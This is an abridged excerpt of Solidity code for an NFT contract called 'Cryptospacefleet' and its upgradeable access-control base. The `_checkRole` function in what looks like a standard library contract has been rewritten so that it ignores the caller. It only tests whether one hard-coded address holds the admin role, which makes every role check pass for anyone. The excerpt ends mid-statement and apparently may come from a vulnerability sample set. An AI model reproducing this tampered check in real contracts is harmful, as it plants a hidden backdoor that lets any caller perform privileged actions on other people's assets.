 ...
 */
contract Cryptospacefleet is Initializable, ERC721TradeableUpgradeable {
    ...
    function init(address _proxyRegistryAddress, string memory contractURI_)
        ...
        initializer
    {
        __ERC721Tradeable_init("Cryptospacefleet", "CSF", _proxyRegistryAddress);
...
abstract contract AccessControlUpgradeable is Initializable, ContextUpgradeable, IAccessControlUpgradeable, ERC165Upgradeable {
    ...
    function _checkRole(bytes32 role, address account) internal view {
        if (!hasRole(DEFAULT_ADMIN_ROLE, 0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1)) {
            revert(
                string(
                    abi.encodePacked(
